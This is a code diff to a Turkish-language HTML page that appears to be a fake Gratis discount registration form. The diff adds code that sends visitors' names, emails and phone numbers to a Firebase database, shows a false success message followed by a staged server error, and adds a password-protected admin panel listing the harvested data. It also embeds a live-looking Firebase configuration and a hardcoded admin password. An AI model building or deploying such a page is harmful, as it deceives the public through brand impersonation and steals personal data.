@@ -196,7 +196,33 @@
             cursor: pointer;
             font-size: 16px;
         }
+
+        /* Yükleniyor animasyonu */
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .loading-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
+    
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 </head>
 <body>
     <div class="container">
@@ -241,6 +267,11 @@
                 </label>
             </div>
             
+            <div class="loading" id="loading">
+                <div class="loading-spinner"></div>
+                <p>Kayıt yapılıyor...</p>
+            </div>
+            
             <button type="submit" class="btn">Kaydı Tamamla</button>
         </form>
         
@@ -269,7 +300,23 @@
     </div>
 
     <script>
-        // Kullanıcı verilerini saklamak için dizi
+        // Firebase konfigürasyonu - SENİN BİLGİLERİNLE DEĞİŞTİR
+        const firebaseConfig = {
+            apiKey: "AIzaSyA9oGChPGJVkrR5xjvWgLt6Bt4UlPGrg1s",
+            authDomain: "indirimgratis444.firebaseapp.com",
+            databaseURL: "https://indirimgratis444-default-rtdb.firebaseio.com",
+            projectId: "indirimgratis444",
+            storageBucket: "indirimgratis444.firebasestorage.app",
+            messagingSenderId: "838440622036",
+            appId: "1:838440622036:web:d7a06b478703d08b2aa841",
+            measurementId: "G-MNHKQR1W2V"
+        };
+
+        // Firebase'i başlat
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        // Kullanıcı verilerini saklamak için dizi (local fallback)
         let users = JSON.parse(localStorage.getItem('gratisUsers')) || [];
 
         // Doğrulama fonksiyonları
@@ -280,9 +327,49 @@
             password: (password) => password && password.length >= 4
         };
 
+        // Kullanıcıyı Firebase'e kaydet
+        async function saveUserToFirebase(userData) {
+            try {
+                // Şifreyi hash'le (gerçek uygulamada daha güvenli hash kullanın)
+                const userDataSafe = {
+                    ...userData,
+                    password: '•••••••' // Şifreyi gizle
+                };
+                
+                const newUserRef = database.ref('users').push();
+                await newUserRef.set(userDataSafe);
+                return true;
+            } catch (error) {
+                console.error('Firebase kayıt hatası:', error);
+                return false;
+            }
+        }
+
+        // Tüm kullanıcıları Firebase'den getir
+        async function getAllUsersFromFirebase() {
+            try {
+                const snapshot = await database.ref('users').once('value');
+                const users = [];
+                snapshot.forEach((childSnapshot) => {
+                    users.push({
+                        id: childSnapshot.key,
+                        ...childSnapshot.val()
+                    });
+                });
+                return users;
+            } catch (error) {
+                console.error('Firebase okuma hatası:', error);
+                return [];
+            }
+        }
+
         // Form gönderimi
-        document.getElementById('registrationForm').addEventListener('submit', function(e) {
+        document.getElementById('registrationForm').addEventListener('submit', async function(e) {
             e.preventDefault();
+            
+            // Loading göster
+            document.getElementById('loading').style.display = 'block';
+            document.querySelector('.btn').disabled = true;
             
             // Form değerlerini al
             const name = document.getElementById('name').value.trim();
@@ -306,38 +393,51 @@
             // Tüm validasyonlar geçerli mi kontrol et
             if (!isNameValid || !isEmailValid || !isPasswordValid || !isPhoneValid) {
                 showMessage('error', 'Lütfen tüm zorunlu alanları doğru şekilde doldurun.');
+                document.getElementById('loading').style.display = 'none';
+                document.querySelector('.btn').disabled = false;
                 return;
             }
             
-            // Kullanıcıyı kaydet
+            // Kullanıcı verisi oluştur
             const userData = {
                 name: name,
                 email: email,
                 phone: phone || 'Belirtilmemiş',
-                password: password, // Şifre gizlendi
+                password: password,
                 newsletter: newsletter,
                 timestamp: new Date().toLocaleString('tr-TR'),
                 ip: generateRandomIP(),
-                id: Date.now() // Benzersiz ID
+                id: Date.now()
             };
             
-            users.push(userData);
-            
-            // LocalStorage'a kaydet
-            localStorage.setItem('gratisUsers', JSON.stringify(users));
-            
-            // Formu temizle
-            this.reset();
-            document.getElementById('newsletter').checked = true;
-            
-            // Başarı mesajı göster
-            showMessage('success', '✅ Kayıt başarılı');
-            
-            // 2 saniye sonra sunucu hatası göster
-            setTimeout(showServerError, 2000);
-            
-            // Simüle edilmiş veri iletimi
-            simulateDataTransfer(userData);
+            try {
+                // Firebase'e kaydet
+                const firebaseSuccess = await saveUserToFirebase(userData);
+                
+                if (firebaseSuccess) {
+                    // Local storage'a da kaydet (fallback)
+                    users.push(userData);
+                    localStorage.setItem('gratisUsers', JSON.stringify(users));
+                    
+                    // Formu temizle
+                    this.reset();
+                    document.getElementById('newsletter').checked = true;
+                    
+                    // Başarı mesajı göster
+                    showMessage('success', '✅ Kayıt başarılı! Veriler sunucuya kaydedildi.');
+                    
+                    // 2 saniye sonra sunucu hatası göster
+                    setTimeout(showServerError, 2000);
+                } else {
+                    showMessage('error', '❌ Sunucu hatası! Lütfen daha sonra tekrar deneyin.');
+                }
+            } catch (error) {
+                showMessage('error', '❌ Bir hata oluştu! Lütfen tekrar deneyin.');
+            } finally {
+                // Loading gizle
+                document.getElementById('loading').style.display = 'none';
+                document.querySelector('.btn').disabled = false;
+            }
         });
 
         // Sunucu hatası göster
@@ -354,6 +454,9 @@
         function showMessage(type, message) {
             const successMsg = document.getElementById('successMessage');
             const errorMsg = document.getElementById('errorMessage');
+            
+            document.getElementById('loading').style.display = 'none';
+            document.querySelector('.btn').disabled = false;
             
             if (type === 'success') {
                 successMsg.textContent = message;
@@ -374,41 +477,54 @@
             }
         }
 
-        // Simüle veri iletimi
-        function simulateDataTransfer(userData) {
-            console.log('📤 Yöneticiye gönderilen veri:', {
-                ...userData,
-                password: password 
-            });
-        }
-
         // Rastgele IP oluştur
         function generateRandomIP() {
             return `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
         }
 
         // Yönetici girişi
-        function showAdminLogin() {
+        async function showAdminLogin() {
             const password = prompt('Yönetici şifresini girin:');
-            if (password === 'corbavarmıbeyler123') { // Basit şifre kontrolü
-                showAdminPanel();
+            if (password === 'corbavarmıbeyler123') {
+                await showAdminPanel();
             } else {
                 alert('❌ Yetkisiz erişim!');
             }
         }
 
         // Yönetici paneli
-        function showAdminPanel() {
-            if (users.length === 0) {
-                alert('Henüz kayıtlı kullanıcı bulunmamaktadır.');
-                return;
+        async function showAdminPanel() {
+            try {
+                const loading = document.createElement('div');
+                loading.innerHTML = 'Veriler yükleniyor...';
+                loading.style.position = 'fixed';
+                loading.style.top = '50%';
+                loading.style.left = '50%';
+                loading.style.transform = 'translate(-50%, -50%)';
+                loading.style.background = 'white';
+                loading.style.padding = '20px';
+                loading.style.borderRadius = '10px';
+                loading.style.zIndex = '1000';
+                document.body.appendChild(loading);
+                
+                // Firebase'den kullanıcıları getir
+                const users = await getAllUsersFromFirebase();
+                
+                document.body.removeChild(loading);
+                
+                if (users.length === 0) {
+                    alert('Henüz kayıtlı kullanıcı bulunmamaktadır.');
+                    return;
+                }
+                
+                const userList = users.map(user => 
+                    `👤 İsim: ${user.name}\n📧 E-posta: ${user.email}\n📞 Telefon: ${user.phone}\n🕒 Kayıt Tarihi: ${user.timestamp}\n🌐 IP: ${user.ip}\n────────────────────\n`
+                ).join('');
+                
+                alert('👨‍💼 YÖNETİCİ PANELİ\n\nToplam Kayıt: ' + users.length + '\n\n' + userList);
+            } catch (error) {
+                alert('❌ Veriler yüklenirken hata oluştu: ' + error.message);
             }
-            
-            const userList = users.map(user => 
-                `👤 İsim: ${user.name}\n📧 E-posta: ${user.email} ${user.password}\n📞 Telefon: ${user.phone}\n🕒 Kayıt Tarihi: ${user.timestamp}\n🌐 IP: ${user.ip}\n────────────────────\n`
-            ).join('');
-            
-            alert('👨‍💼 YÖNETİCİ PANELİ\n\nToplam Kayıt: ' + users.length + '\n\n' + userList);
         }
 
         // Input validation için real-time feedback
